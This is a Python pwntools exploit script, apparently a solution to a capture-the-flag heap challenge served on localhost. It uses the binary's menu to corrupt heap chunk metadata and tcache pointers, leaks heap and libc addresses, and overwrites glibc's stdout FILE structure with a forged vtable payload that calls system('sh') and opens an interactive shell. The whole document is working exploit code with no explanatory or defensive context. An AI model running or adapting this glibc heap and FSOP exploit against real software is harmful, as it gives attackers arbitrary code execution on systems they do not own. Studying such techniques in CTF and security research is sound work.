#!/usr/bin/env python3
from pwn import *
exe = ELF("./chal", checksec=False)  
libc = ELF("./libc.so.6", checksec=False)    

context.binary = exe

#p = process([exe.path])
p = remote("127.0.0.1", "5000")
current_idx = -1


def add(size):
   global current_idx
   p.sendlineafter(b"> ", b"1")
   p.sendlineafter(b"entry: ", str(size).encode())
   current_idx += 1
   return current_idx

def edit(idx, data, pos=0):
   p.sendlineafter(b"> ", b"2")
   p.sendlineafter(b"entry: ", str(idx).encode())
   p.sendlineafter(b"data", str(pos).encode())
   p.sendafter(b"data: ", data)

def delete(idx):
   global current_idx
   p.sendlineafter(b"> ", b"3")
   p.sendlineafter(b"entry: ", str(idx).encode())

   if current_idx==idx:
       current_idx -= 1

def get_leak():
   p.sendlineafter(b"> ", b"5")
   p.recvuntil(b"exit(): ")
   try:
       exit_leak = int(p.recvline().strip(), 16)
   except:
       exit_leak = 0
    
   p.recvuntil(b"heap: ")
   try:
       heap_leak = int(p.recvline().strip(), 16)
   except:
       heap_leak = 0
   return exit_leak, heap_leak



for _ in range(7):
   add(0x90 - 8)  

middle = add(0x90 - 8)

largebuf_sz = 0x20 + 0x30 + 0x500 + (0x90-8)*2
largebuf = add(largebuf_sz)

guard = add(0x18)

delete(largebuf)

guard_R = add(0x10018)  


corruptme = add(0x4c8)
start_shifted = add(0x90-8)  
midguard = add(0x28)   
end_shifted = add(0x90-8)    
leftovers = add(0x28)  

edit(guard_R, p64(0x651), pos=0x18)  

delete(corruptme)

offset_chunk = add(0x4c8 + 0x10)  

start_chunk = add(0x90-8)  
midguard2 = add(0x28)
end = add(0x90-8)  
leftovers_2 = add(0x18)  

target_dist = (0x10000+0x80) - 0xda0 - 0x18
add(target_dist)

fake_data = add(0x18)
edit(fake_data, p64(0x10000) + p64(0x20))  

size_lsb = add(0x3d8)
size_msb = add(0x3e8)
delete(size_lsb)
delete(size_msb)

edit(guard_R, p64(0x31), pos=0x4e8)  
delete(start_shifted)  
edit(guard_R, p64(0x91), pos=0x4f8)

edit(guard_R, p64(0x21), pos=0x5a8)
delete(end_shifted)    
edit(guard_R, p64(0x91), pos=0x5b8)

for i in range(7):
   delete(i)

delete(end)
delete(middle)
delete(start_chunk)

libc_leak, heap_leak = get_leak()
log.info(f"Heap Leak: {hex(heap_leak)}")
log.info(f"libc Leak: {hex(libc_leak)}")

partial_ptr = (heap_leak << 12) + 0x80
edit(guard_R, p16(partial_ptr), pos=0x500)
edit(guard_R, p16(partial_ptr), pos=0x5c8)

exit_lsb = (libc_leak << 12) + (libc.sym['exit'] & 0xfff)
stdout_offset = libc.sym['_IO_2_1_stdout_'] - libc.sym['exit']
stdout_lsb = (exit_lsb + stdout_offset) & 0xffff
info(f"{stdout_lsb=:#x}")


win = add(0x888)  
log.success(f"tcache chunk index: {win}")
edit(win,p16(stdout_lsb),8)
stdout = add(0x28)
log.info(f"stdout at index{stdout}")

edit(stdout, p64(0xfbad3887)+p64(0)*3+p16(stdout_lsb+8), 0)
print(stdout_lsb+0x8)
leak_data = p.recv(4096, timeout=1)
clean_leak = leak_data.lstrip(b'\x00')
leaked_bytes = clean_leak[0:8]
stdout_leak = u64(leaked_bytes.ljust(8, b'\x00'))
print(f" stdout address: {hex(stdout_leak)}")
libc.address = stdout_leak - libc.symbols['_IO_2_1_stdout_'] -8
print(f"Libc Base: {hex(libc.address)}")
p.sendline()

stdout_addr = libc.sym['_IO_2_1_stdout_']
system_addr = libc.sym['system']
wfile_jumps = libc.sym['_IO_wfile_jumps']

payload = flat({
    0x0:  b"  sh\x00\x00\x00\x00",     # _flags: "  sh"
    0x20: p64(0),                      # _IO_write_base
    0x28: p64(1),                      # _IO_write_ptr
    0x68: p64(system_addr),            # _chain (holds system ptr)
    0x88: p64(stdout_addr - 0x10),     # _lock
    0x98: p64(stdout_addr),            # _codecvt (fake wide_vtable ptr)
    0xa0: p64(stdout_addr - 0x48),     # _wide_data
    0xc0: p64(0),                      # _mode
    0xd8: p64(wfile_jumps)             # vtable
}, filler=b'\x00', length=0xe0)

edit(win,p64(libc.sym['_IO_2_1_stdout_']),8*60)
print("done")
full_stdout = add(0x3e0-8)
edit(full_stdout,payload)

p.interactive()
